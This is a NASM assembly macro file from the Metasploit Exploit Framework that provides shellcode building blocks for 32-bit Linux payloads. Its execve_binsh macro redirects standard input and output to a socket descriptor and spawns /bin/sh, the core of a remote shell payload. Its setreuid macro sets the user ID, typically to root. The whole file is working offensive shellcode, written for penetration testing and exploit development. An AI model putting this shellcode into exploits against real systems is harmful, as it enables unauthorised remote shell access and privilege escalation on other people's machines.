;;
;
;        Name: generic
;        Type: Macro Set
;   Qualities: None
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1407 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This file provides a generic API of macros that can be used
;        by payloads.  No payloads are actually implemented within this
;        file.
;
; Macro List:
;
;        execve_binsh - Executes a command shell with flags
;        setreuid     - Set real/effective user id
;;
BITS 32

;;
; Define undefined assumptions
;;
%ifndef ASSUME_REG_EDX
%define ASSUME_REG_EDX -1
%endif
%ifndef ASSUME_REG_EAX
%define ASSUME_REG_EAX -1
%endif

;;
;     Macro: execve_binsh
;   Purpose: Execute a command shell with various options
; Arguments:
;
;    Execution flags: Flags used for executing the command shell in a 
;                     number of modes.
;
;        EXECUTE_REDIRECT_IO      => Redirects stdin/stdout/stderr to the fd
;                                    passed in 'edi'.
;        EXECUTE_DISABLE_READLINE => Disables readline support.  This is 
;                                    needed for redirection to UDP sockets.
;;
%define EXECUTE_REDIRECT_IO      0x0001
%define EXECUTE_DISABLE_READLINE 0x0002

%macro execve_binsh 1

	%if %1 & EXECUTE_REDIRECT_IO

dup:
%ifdef FD_REG_EBX
%else
	mov  ebx, edi
%endif
	push byte 0x2
	pop  ecx
dup_loop:
%if ASSUME_REG_EAX == 0
	mov  al, 0x3f
%else
	push byte 0x3f
	pop  eax
%endif
	int  0x80
	dec  ecx
	jns  dup_loop

	%endif

execve:
%if ASSUME_REG_EAX == 0
	mov  al, 0xb
%else
	push byte 0xb
	pop  eax
%endif
%if ASSUME_REG_EDX == 0
%else
	cdq
%endif
	push edx

	%if %1 & EXECUTE_DISABLE_READLINE

	push word 0x692d
	mov  ecx, esp
	push byte 0x67
	push word 0x6e69
	push dword 0x74696465
	push dword 0x6f6e2d2d
	mov  edi, esp
	push edx
	push dword 0x68732f2f
	push dword 0x6e69622f

	%else

	push dword 0x68732f2f
	push dword 0x6e69622f

	%endif

	mov  ebx, esp
	push edx

	%if %1 & EXECUTE_DISABLE_READLINE

	push ecx
	push edi

	%endif
	
	push ebx
	mov  ecx, esp
	int  0x80

%endmacro

;;
;     Macro: setreuid
;   Purpose: Set effective user id
; Arguments:
;
;    User ID: The user identifier to setreuid to, typically 0.
;;

%macro setreuid 1

setreuid:

	%if %1 == 0

	xor  ecx, ecx

	%else

		%if %1 < 256

		push byte %1

		%else

		push dword %1

		%endif

	pop  ecx

	%endif

	mov  ebx, ecx
	push byte 0x46
	pop  eax
	int  0x80

%endmacro
